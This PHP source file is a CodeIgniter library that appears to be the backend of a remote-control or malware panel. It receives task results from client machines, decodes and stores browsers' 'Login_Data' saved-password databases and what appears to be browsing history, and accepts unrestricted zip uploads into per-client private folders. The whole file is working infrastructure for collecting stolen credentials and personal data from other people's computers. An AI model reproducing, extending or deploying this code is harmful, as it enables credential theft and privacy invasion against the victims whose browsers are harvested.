<?php
defined('BASEPATH') OR exit('No direct script access allowed');


class Browsers
{
    protected $CI;
    protected $params;

    public function __construct($params)
    {
        $this->CI =& get_instance();
        $this->params = $params['params'];
        $this->CI->load->model('Client_model','client');
        $this->CI->load->model('Task_model','task');
        $this->CI->load->helper('string');
    }

    public function cl(){
        $param = $this->params;
        $data = json_decode($param->result);
        if($data->status){
            foreach ($data->data as $browser) {
                if($browser->Login_Data->type == 'file'){
                    $browser->Login_Data->data = $this->save_file($browser->Login_Data->data,$param->key);
                }
            }
        }
        $this->CI->task->updateTaskResult($param->id,$param->key,json_encode($data),2);
    }
    public function h(){
        $param = $this->params;
        $data = json_decode($param->result);
        if($data->status){
            foreach ($data->data as $browser) {
                if($browser->type == 'file'){
                    $browser->data = $this->save_file($browser->data,$param->key);
                }
            }
        }
        $this->CI->task->updateTaskResult($param->id,$param->key,json_encode($data),2);
    }
    private function save_file($data,$key){
        $file_path = "files/private/".$key."/".date('Ymd',time())."/";
        $file_name = random_string('md5') . '.db';
        if(!file_exists($file_path)){
            mkdir($file_path, 0700,true);
        }
        file_put_contents($file_path.$file_name,base64_decode($data));
        return $file_path.$file_name;
    }
    public function up(){
        $param = $this->params;
        if(!empty($_FILES['file'])){
            $newpath = "files/private/".$param->key."/".date('Ymd',time())."/";
            if(!file_exists($newpath)){
                mkdir($newpath, 0700,true);
            }
            $file_name = random_string('md5');
            $config['upload_path'] = $newpath;
            $config['allowed_types'] = '*';
            $config['max_size'] = 0;
            $config['file_name'] = $file_name.'.zip';
            $this->CI->load->library('upload', $config);
            if($this->CI->upload->do_upload('file')){
                $data = $this->CI->upload->data();
                $full_path = strstr($data['full_path'],'files/private');
                $result = json_encode(array(
                    "full_path" => $full_path,
                    "save_name" => $param->save_name,
                    "file_size" => $data['file_size'],
                    "status" => TRUE
                ));
            }else{
                $result = json_encode(array(
                    "full_path" => "",
                    "save_name" => "",
                    "file_size" => "",
                    "status" => FALSE
                ));
            }
            $this->CI->task->updateTaskResult($param->id,$param->key,$result,2);
        }else{
            $result = json_encode(array(
                "full_path" => "",
                "save_name" => "",
                "file_size" => "",
                "status" => FALSE
            ));
            $this->CI->task->updateTaskResult($param->id,$param->key,$result,2);
        }

    }
}